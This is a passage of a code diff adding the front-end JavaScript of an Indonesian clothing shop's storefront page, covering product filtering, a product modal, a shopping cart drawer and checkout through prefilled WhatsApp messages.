+                            <i class="fa-brands fa-whatsapp text-sm"></i> Tanya Produk ini
+                        </button>
+                    </div>
+                `;
+                container.appendChild(card);
+            });
+            lucide.createIcons();
+        }
+
+        // DIRECT TANYA PRODUK KE WHATSAPP
+        function tanyaProdukDirect(productName) {
+            const text = `Halo jinns_shirt, saya mau tanya stok dan detail untuk produk *${productName}*. Apakah masih ready?`;
+            window.open(`https://wa.me/${WA_NUMBER}?text=${encodeURIComponent(text)}`, '_blank');
+        }
+
+        // TANYA VIA MODAL WITH SELECTED SIZE & QTY
+        function tanyaDirectWhatsApp() {
+            if (!selectedProduct) return;
+            const text = `Halo jinns_shirt, saya ingin bertanya tentang produk:\n- *${selectedProduct.name}*\n- Size: *${selectedSize}*\n- Qty: *${quantity}*\nApakah stoknya masih tersedia?`;
+            window.open(`https://wa.me/${WA_NUMBER}?text=${encodeURIComponent(text)}`, '_blank');
+        }
+
+        // FILTER CATEGORIES
+        function filterCategory(category) {
+            const buttons = document.querySelectorAll('.category-btn');
+            buttons.forEach(btn => {
+                const btnText = btn.textContent.trim();
+                if (btnText === category || (category === 'All' && btnText === 'Semua')) {
+                    btn.className = "category-btn active px-4 py-2 text-xs font-semibold rounded-full bg-brand-600 text-white shadow-sm transition-all";
+                } else {
+                    btn.className = "category-btn px-4 py-2 text-xs font-semibold rounded-full bg-gray-100 text-gray-600 hover:bg-gray-200 transition-all";
+                }
+            });
+
+            if (category === 'All') {
+                renderProducts(products);
+            } else {
+                const filtered = products.filter(p => p.category === category);
+                renderProducts(filtered);
+            }
+        }
+
+        // OPEN PRODUCT MODAL
+        function openProductModal(productId) {
+            selectedProduct = products.find(p => p.id === productId);
+            if (!selectedProduct) return;
+
+            selectedSize = 'M';
+            quantity = 1;
+
+            document.getElementById('modalTitle').textContent = selectedProduct.name;
+            document.getElementById('modalPrice').textContent = `Rp ${selectedProduct.price.toLocaleString('id-ID')}`;
+            document.getElementById('modalImg').src = selectedProduct.image;
+            document.getElementById('modalCategoryBadge').textContent = selectedProduct.category;
+            document.getElementById('modalDesc').textContent = selectedProduct.desc;
+            document.getElementById('modalQty').textContent = quantity;
+
+            updateSizeUI();
+
+            const modal = document.getElementById('productModal');
+            modal.classList.remove('hidden');
+            setTimeout(() => {
+                modal.classList.remove('opacity-0');
+                modal.children[0].classList.remove('scale-95');
+                modal.children[0].classList.add('scale-100');
+            }, 10);
+        }
+
+        // CLOSE MODAL
+        function closeModal() {
+            const modal = document.getElementById('productModal');
+            modal.children[0].classList.remove('scale-100');
+            modal.children[0].classList.add('scale-95');
+            modal.classList.add('opacity-0');
+            setTimeout(() => {
+                modal.classList.add('hidden');
+            }, 300);
+        }
+
+        // SELECT SIZE
+        function selectSize(size) {
+            selectedSize = size;
+            updateSizeUI();
+        }
+
+        function updateSizeUI() {
+            const buttons = document.querySelectorAll('.size-btn');
+            buttons.forEach(btn => {
+                if (btn.textContent.trim() === selectedSize) {
+                    btn.className = "size-btn py-2 text-xs font-bold border-2 border-brand-600 bg-brand-50 text-brand-700 rounded-xl transition-all";
+                } else {
+                    btn.className = "size-btn py-2 text-xs font-bold border border-gray-200 rounded-xl hover:border-brand-500 transition-all text-gray-700 bg-white";
+                }
+            });
+        }
+
+        // QUANTITY COUNTER
+        function updateQty(change) {
+            if (quantity + change >= 1) {
+                quantity += change;
+                document.getElementById('modalQty').textContent = quantity;
+            }
+        }
+
+        // ADD ITEM TO CART FROM MODAL
+        function addToCartFromModal() {
+            if (!selectedProduct) return;
+
+            const existingIndex = cart.findIndex(item => item.id === selectedProduct.id && item.size === selectedSize);
+
+            if (existingIndex > -1) {
+                cart[existingIndex].qty += quantity;
+            } else {
+                cart.push({
+                    id: selectedProduct.id,
+                    name: selectedProduct.name,
+                    price: selectedProduct.price,
+                    image: selectedProduct.image,
+                    size: selectedSize,
+                    qty: quantity
+                });
+            }
+
+            closeModal();
+            updateCartUI();
+            showToast(`"${selectedProduct.name} (${selectedSize})" ditambahkan!`);
+        }
+
+        // DRAWER TOGGLE
+        function toggleCartDrawer(open) {
+            const backdrop = document.getElementById('cartBackdrop');
+            const content = document.getElementById('cartContent');
+
+            if (open) {
+                backdrop.classList.remove('opacity-0');
+                content.classList.remove('translate-x-full');
+            } else {
+                backdrop.classList.add('opacity-0');
+                content.classList.add('translate-x-full');
+            }
+        }
+
+        // UPDATE CART UI & CALCULATE TOTAL
+        function updateCartUI() {
+            const container = document.getElementById('cartItemsList');
+            const badge = document.getElementById('cartBadge');
+            const subtotalEl = document.getElementById('cartSubtotal');
+
+            const totalItems = cart.reduce((sum, item) => sum + item.qty, 0);
+            const totalSubtotal = cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
+
+            badge.textContent = totalItems;
+            if (totalItems > 0) {
+                badge.classList.remove('scale-0');
+            } else {
+                badge.classList.add('scale-0');
+            }
+
+            subtotalEl.textContent = `Rp ${totalSubtotal.toLocaleString('id-ID')}`;
+
+            container.innerHTML = '';
+            if (cart.length === 0) {
+                container.innerHTML = `
+                    <div class="flex flex-col items-center justify-center h-64 text-center text-gray-400">
+                        <i data-lucide="shopping-bag" class="w-12 h-12 stroke-[1.5] mb-3"></i>
+                        <p class="text-sm font-semibold">Keranjang kamu masih kosong.</p>
+                    </div>
+                `;
+                lucide.createIcons();
+                return;
+            }
+
+            cart.forEach((item, index) => {
+                const el = document.createElement('div');
+                el.className = "flex items-center gap-4 bg-gray-50 p-3.5 rounded-2xl border border-gray-100";
+                el.innerHTML = `
+                    <img src="${item.image}" alt="${item.name}" class="w-16 h-16 object-cover rounded-xl bg-gray-200">
+                    <div class="flex-1 min-w-0">
+                        <h4 class="text-xs font-bold text-gray-900 truncate">${item.name}</h4>
+                        <span class="inline-block px-2 py-0.5 mt-1 bg-white border border-gray-200 rounded text-[10px] font-bold text-gray-600">
+                            Size: ${item.size}
+                        </span>
+                        <p class="text-xs font-extrabold text-brand-600 mt-1">Rp ${(item.price * item.qty).toLocaleString('id-ID')}</p>
+                    </div>
+                    <div class="flex flex-col items-end gap-2">
+                        <button type="button" onclick="removeCartItem(${index})" class="text-gray-400 hover:text-red-500 transition-colors">
+                            <i data-lucide="trash-2" class="w-4 h-4"></i>
+                        </button>
+                        <div class="flex items-center border border-gray-200 rounded-lg overflow-hidden bg-white text-xs">
+                            <button type="button" onclick="changeCartQty(${index}, -1)" class="px-2 py-0.5 text-gray-600 hover:bg-gray-100 font-bold">-</button>
+                            <span class="px-2 font-bold">${item.qty}</span>
+                            <button type="button" onclick="changeCartQty(${index}, 1)" class="px-2 py-0.5 text-gray-600 hover:bg-gray-100 font-bold">+</button>
+                        </div>
+                    </div>
+                `;
+                container.appendChild(el);
+            });
+            lucide.createIcons();
+        }
+
+        function changeCartQty(index, change) {
+            if (cart[index].qty + change >= 1) {
+                cart[index].qty += change;
+            } else {
+                cart.splice(index, 1);
+            }
+            updateCartUI();
+        }
+
+        function removeCartItem(index) {
+            cart.splice(index, 1);
+            updateCartUI();
+        }
+
+        // SHOW TOAST NOTIFICATION
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toastMsg').textContent = msg;
+
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            setTimeout(() => {
+                toast.classList.add('translate-y-20', 'opacity-0');
+            }, 3000);
+        }
+
+        // WHATSAPP CHECKOUT GENERATOR
+        function checkoutWhatsApp() {
+            if (cart.length === 0) {
+                showToast("Keranjang belanjaan kamu kosong!");
+                return;
+            }
+
+            let text = "Halo *jinns_shirt*, saya mau checkout baju berikut:\n\n";
+
+            let total = 0;
+            cart.forEach((item, i) => {
+                const sub = item.price * item.qty;
+                total += sub;
+                text += `${i + 1}. *${item.name}*\n   - Size: ${item.size}\n   - Jumlah: ${item.qty}\n   - Harga: Rp ${sub.toLocaleString('id-ID')}\n\n`;
+            });
+
+            text += `*Total Belanja:* Rp ${total.toLocaleString('id-ID')}\n\nMohon info ketersediaan stok & rincian pembayaran. Terima kasih!`;
+
+            const encodedText = encodeURIComponent(text);
+            window.open(`https://wa.me/${WA_NUMBER}?text=${encodedText}`, '_blank');
+        }
+    </script>
+</body>
+</html>
